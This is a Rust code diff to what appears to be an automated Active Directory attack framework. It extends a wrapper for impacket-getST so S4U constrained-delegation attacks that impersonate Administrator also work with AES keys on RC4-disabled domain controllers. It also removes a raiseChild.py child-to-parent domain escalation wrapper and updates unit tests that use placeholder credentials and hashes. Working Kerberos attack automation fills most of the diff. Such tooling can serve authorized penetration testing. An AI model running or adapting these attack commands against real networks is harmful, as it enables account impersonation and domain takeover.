@@ -37,19 +37,36 @@ pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
 /// Perform an S4U (constrained delegation) attack to obtain a service ticket.
 ///
 /// Required args: `domain`, `username`, `target_spn`, `impersonate`
-/// Optional args: `password`, `hash`, `dc_ip`
+/// Optional args: `password`, `hash`, `aes_key`, `dc_ip`
 pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
+    build_s4u_command(args)?.execute().await
+}
+
+/// Build the `impacket-getST` command for an S4U attack.
+///
+/// Split out from [`s4u_attack`] so unit tests can assert on the constructed
+/// argument vector (via `args_for_test`) without spawning the binary.
+///
+/// getST.py expects `domain/user:pass` or `domain/user -hashes :hash` — no
+/// `@target` suffix (unlike secretsdump/wmiexec); the DC is specified via
+/// `-dc-ip` instead. When an AES256 key is available it is passed via
+/// `-aesKey` so getST requests AES-etype tickets. Without it, impacket
+/// authenticates RC4-only through `-hashes` and an AES-only delegating
+/// account (or a hardened DC with RC4 disabled) rejects the S4U TGS with
+/// `KDC_ERR_ETYPE_NOSUPP`.
+#[doc(hidden)]
+pub fn build_s4u_command(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = optional_str(args, "password");
-    let hash = optional_str(args, "hash");
+    // Treat empty-string secrets as "not provided" — impacket-getST would
+    // otherwise prompt interactively and the task would time out.
+    let password = optional_str(args, "password").filter(|s| !s.is_empty());
+    let hash = optional_str(args, "hash").filter(|s| !s.is_empty());
+    let aes_key = optional_str(args, "aes_key").filter(|s| !s.is_empty());
     let target_spn = required_str(args, "target_spn")?;
     let impersonate = required_str(args, "impersonate")?;
     let dc_ip = optional_str(args, "dc_ip");
 
-    // getST.py expects `domain/user:pass` or `domain/user -hashes :hash`
-    // — no `@target` suffix (unlike secretsdump/wmiexec). The DC is
-    // specified via `-dc-ip` instead.
     let mut cmd = CommandBuilder::new("impacket-getST")
         .flag("-spn", target_spn)
         .flag("-impersonate", impersonate);
@@ -60,15 +77,22 @@ pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
             .args(credentials::hash_args(h));
     } else if let Some(p) = password {
         cmd = cmd.arg(format!("{domain}/{username}:{p}"));
+    } else if aes_key.is_some() {
+        // AES-only authenticator: secretsdump yielded an AES key but no usable
+        // NT hash/password. getST derives the TGT from `-aesKey` alone, so the
+        // positional identity carries no secret.
+        cmd = cmd.arg(format!("{domain}/{username}"));
     } else {
-        anyhow::bail!("s4u_attack requires either password or hash");
+        anyhow::bail!("s4u_attack requires a non-empty password, hash, or aes_key — got none");
     }
 
-    cmd = cmd.timeout_secs(120);
+    // Supply the AES256 key so getST negotiates AES etypes. This is the fix
+    // for `KDC_ERR_ETYPE_NOSUPP` on accounts/DCs where RC4 is disabled.
+    if let Some(aes) = aes_key {
+        cmd = cmd.flag("-aesKey", aes);
+    }
 
-    cmd = cmd.flag_opt("-dc-ip", dc_ip);
-
-    cmd.execute().await
+    Ok(cmd.timeout_secs(120).flag_opt("-dc-ip", dc_ip))
 }
 
 /// Generate a Kerberos golden ticket using impacket-ticketer.
@@ -193,76 +217,6 @@ pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
         .timeout_secs(120)
         .execute()
         .await
-}
-
-/// Escalate from child domain to parent domain using raiseChild.py.
-///
-/// Required args: `child_domain`, `username`
-/// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
-/// Optional args: `child_dc_ip`, `parent_domain`, `parent_dc_ip` — when supplied,
-/// these are written to `/etc/hosts` so the impacket script can resolve domain
-/// FQDNs without forest DNS access. raiseChild itself only takes the positional
-/// `domain/user[:pass]` + auth flags; the IP args are NOT forwarded to it.
-///
-/// raiseChild auto-discovers the parent forest root via the child DC's
-/// trustedDomain LDAP objects, so callers don't need to supply parent FQDN
-/// or DC IPs to the script. But raiseChild *does* call `gethostbyname()` /
-/// SMB-binds against the bare domain name (e.g. `child.contoso.local`),
-/// not the DC FQDN — so on a worker without forest DNS this fails with
-/// `Name or service not known`. Pre-seeding `/etc/hosts` fixes that.
-pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
-    let child_domain = required_str(args, "child_domain")?;
-    let username = required_str(args, "username")?;
-    let password = optional_str(args, "password");
-    let hash = optional_str(args, "hash");
-    let child_dc_ip = optional_str(args, "child_dc_ip").filter(|s| !s.is_empty());
-    let parent_domain = optional_str(args, "parent_domain").filter(|s| !s.is_empty());
-    let parent_dc_ip = optional_str(args, "parent_dc_ip").filter(|s| !s.is_empty());
-
-    if password.is_none() && hash.is_none() {
-        anyhow::bail!("raise_child requires either 'password' or 'hash' for authentication");
-    }
-
-    if let Some(ip) = child_dc_ip {
-        crate::privesc::trust::ensure_hosts_entry(ip, child_domain)?;
-    }
-    if let (Some(pd), Some(pip)) = (parent_domain, parent_dc_ip) {
-        crate::privesc::trust::ensure_hosts_entry(pip, pd)?;
-    }
-
-    let mut cmd = CommandBuilder::new("raiseChild.py");
-
-    if let Some(h) = hash {
-        cmd = cmd
-            .arg(format!("{child_domain}/{username}"))
-            .args(credentials::hash_args(h));
-    } else if let Some(p) = password {
-        cmd = cmd.arg(format!("{child_domain}/{username}:{p}"));
-    }
-
-    // raiseChild performs multiple secretsdumps internally — needs extra time
-    let mut output = cmd.timeout_secs(300).execute().await?;
-    if output.success {
-        if let Some(failure_line) = detect_raise_child_failure(&output.combined_raw()) {
-            output.success = false;
-            if !output.stderr.is_empty() && !output.stderr.ends_with('\n') {
-                output.stderr.push('\n');
-            }
-            output.stderr.push_str(&format!(
-                "raiseChild reported failure despite zero exit status: {failure_line}"
-            ));
-        }
-    }
-    Ok(output)
-}
-
-fn detect_raise_child_failure(output: &str) -> Option<&str> {
-    output.lines().find(|line| {
-        let trimmed = line.trim();
-        trimmed.contains("SessionError:")
-            || trimmed.contains("KDC_ERR_")
-            || trimmed.contains("Traceback (most recent call last):")
-    })
 }
 
 #[cfg(test)]
@@ -411,7 +365,112 @@ mod tests {
         let rt = tokio::runtime::Runtime::new().unwrap();
         let result = rt.block_on(super::s4u_attack(&args));
         assert!(result.is_err());
-        assert!(result.unwrap_err().to_string().contains("password or hash"));
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("password, hash, or aes_key"));
+    }
+
+    #[test]
+    fn s4u_attack_empty_password_and_hash_errors() {
+        // Regression: an empty password/hash string must be rejected as if
+        // absent — impacket-getST would otherwise prompt interactively and
+        // the task would time out.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "password": "",
+            "hash": "",
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator"
+        });
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(super::s4u_attack(&args));
+        assert!(result.is_err());
+        assert!(result
+            .unwrap_err()
+            .to_string()
+            .contains("password, hash, or aes_key"));
+    }
+
+    #[test]
+    fn s4u_attack_passes_aes_key_alongside_hash() {
+        // secretsdump yields both the NT hash and the AES256 key for a machine
+        // account. Both must reach getST: `-hashes` for the identity and
+        // `-aesKey` so the TGS is requested with an AES etype — without the
+        // latter, an RC4-disabled DC returns KDC_ERR_ETYPE_NOSUPP.
+        let aes = "a".repeat(64);
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
+            "aes_key": aes,
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator",
+            "dc_ip": "192.168.58.10"
+        });
+        let cmd = super::build_s4u_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(
+            a.iter().any(|x| x == "-aesKey"),
+            "expected -aesKey flag: {a:?}"
+        );
+        assert!(
+            a.iter().any(|x| x == &aes),
+            "expected the AES key value: {a:?}"
+        );
+        assert!(
+            a.iter().any(|x| x == "-hashes"),
+            "hash auth must still be present: {a:?}"
+        );
+    }
+
+    #[test]
+    fn s4u_attack_aes_key_only_authenticates() {
+        // AES key present, no NT hash/password — getST derives the TGT from
+        // `-aesKey` alone, so the positional identity carries no secret and the
+        // wrapper must not bail.
+        let aes = "b".repeat(64);
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "aes_key": aes,
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator"
+        });
+        let cmd = super::build_s4u_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(
+            a.iter().any(|x| x == "-aesKey"),
+            "expected -aesKey flag: {a:?}"
+        );
+        assert!(
+            a.iter().any(|x| x == "contoso.local/svc_web$"),
+            "identity must be the bare domain/user with no secret: {a:?}"
+        );
+        assert!(
+            a.iter().all(|x| x != "-hashes"),
+            "no -hashes when only AES is available: {a:?}"
+        );
+    }
+
+    #[test]
+    fn s4u_attack_omits_aes_key_flag_when_absent() {
+        // Password auth with no AES key — `-aesKey` must not appear so getST
+        // keeps its default etype negotiation.
+        let args = json!({
+            "domain": "contoso.local",
+            "username": "svc_web$",
+            "password": "P@ssw0rd!",
+            "target_spn": "cifs/dc01.contoso.local",
+            "impersonate": "Administrator"
+        });
+        let cmd = super::build_s4u_command(&args).unwrap();
+        let a = cmd.args_for_test();
+        assert!(
+            a.iter().all(|x| x != "-aesKey"),
+            "no -aesKey without an AES key: {a:?}"
+        );
     }
 
     #[test]
@@ -605,74 +664,6 @@ mod tests {
         });
         assert_eq!(optional_str(&args, "method"), Some("rbcd"));
         assert_eq!(optional_str(&args, "create_user"), Some("eviluser"));
-    }
-
-    #[test]
-    fn raise_child_requires_child_domain() {
-        let args = json!({
-            "username": "admin",
-            "password": "P@ssw0rd!"
-        });
-        assert!(required_str(&args, "child_domain").is_err());
-    }
-
-    #[test]
-    fn raise_child_no_auth_errors() {
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "admin"
-        });
-        let rt = tokio::runtime::Runtime::new().unwrap();
-        let result = rt.block_on(super::raise_child(&args));
-        assert!(result.is_err());
-        assert!(result
-            .unwrap_err()
-            .to_string()
-            .contains("password' or 'hash'"));
-    }
-
-    #[test]
-    fn raise_child_with_password_target_format() {
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "admin",
-            "password": "P@ssw0rd!"
-        });
-        let child_domain = required_str(&args, "child_domain").unwrap();
-        let username = required_str(&args, "username").unwrap();
-        let password = optional_str(&args, "password").unwrap();
-        let target = format!("{child_domain}/{username}:{password}");
-        assert_eq!(target, "child.contoso.local/admin:P@ssw0rd!");
-    }
-
-    #[test]
-    fn raise_child_with_hash_target_format() {
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "admin",
-            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
-        });
-        let child_domain = required_str(&args, "child_domain").unwrap();
-        let username = required_str(&args, "username").unwrap();
-        let hash = optional_str(&args, "hash").unwrap();
-        let target = format!("{child_domain}/{username}");
-        let hash_args = credentials::hash_args(hash);
-        assert_eq!(target, "child.contoso.local/admin");
-        assert_eq!(
-            hash_args,
-            vec!["-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0"]
-        );
-    }
-
-    #[test]
-    fn raise_child_target_domain_optional() {
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "admin",
-            "password": "P@ssw0rd!",
-            "target_domain": "contoso.local"
-        });
-        assert_eq!(optional_str(&args, "target_domain"), Some("contoso.local"));
     }
 
     #[test]
@@ -871,66 +862,5 @@ mod tests {
             "create_password": "Ev1lP@ss!"
         });
         assert!(krbrelayup(&args).await.is_ok());
-    }
-
-    #[tokio::test]
-    async fn raise_child_with_password_executes() {
-        mock::push(mock::success());
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "admin",
-            "password": "P@ssw0rd!"
-        });
-        assert!(raise_child(&args).await.is_ok());
-    }
-
-    #[tokio::test]
-    async fn raise_child_with_hash_executes() {
-        mock::push(mock::success());
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "admin",
-            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0",
-            "target_domain": "contoso.local"
-        });
-        assert!(raise_child(&args).await.is_ok());
-    }
-
-    #[tokio::test]
-    async fn raise_child_detects_sessionerror_on_zero_exit() {
-        mock::push(crate::ToolOutput {
-            stdout: "Impacket v0.13.0\n[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)\n"
-                .to_string(),
-            stderr: String::new(),
-            exit_code: Some(0),
-            success: true,
-        });
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "Administrator",
-            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
-        });
-        let output = raise_child(&args).await.unwrap();
-        assert!(!output.success);
-        assert_eq!(output.exit_code, Some(0));
-        assert!(output.stderr.contains("KDC_ERR_TGT_REVOKED"));
-    }
-
-    #[tokio::test]
-    async fn raise_child_keeps_success_without_failure_markers() {
-        mock::push(crate::ToolOutput {
-            stdout: "Impacket v0.13.0\n[*] Success path\n".to_string(),
-            stderr: String::new(),
-            exit_code: Some(0),
-            success: true,
-        });
-        let args = json!({
-            "child_domain": "child.contoso.local",
-            "username": "Administrator",
-            "hash": "31d6cfe0d16ae931b73c59d7e0c089c0"
-        });
-        let output = raise_child(&args).await.unwrap();
-        assert!(output.success);
-        assert!(output.stderr.is_empty());
     }
 }
